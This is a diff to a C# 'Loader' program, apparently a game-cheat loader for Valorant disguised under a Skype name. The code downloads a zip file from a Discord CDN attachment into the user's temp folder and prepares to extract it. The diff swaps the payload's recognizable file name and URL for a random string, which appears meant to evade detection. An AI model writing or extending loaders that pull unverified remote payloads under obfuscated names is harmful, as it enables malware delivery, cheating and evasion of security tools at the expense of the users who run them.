@@ -33,11 +33,11 @@ namespace Loader.Products
 
             try
             {
-                string download = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\SkypeValorant.zip");
+                string download = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\QwSdCxFrYb.zip");
                 string extractzip = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\1");
 
                 WebClient webClient = new WebClient();
-                webClient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/980267575902609431/980288383580524575/SkypeValorant.zip"), @download);
+                webClient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/980267575902609431/983806205749243934/QwSdCxFrYb.zip"), @download);
 
                 Thread.Sleep(9000);
                 string zipPatch = download;
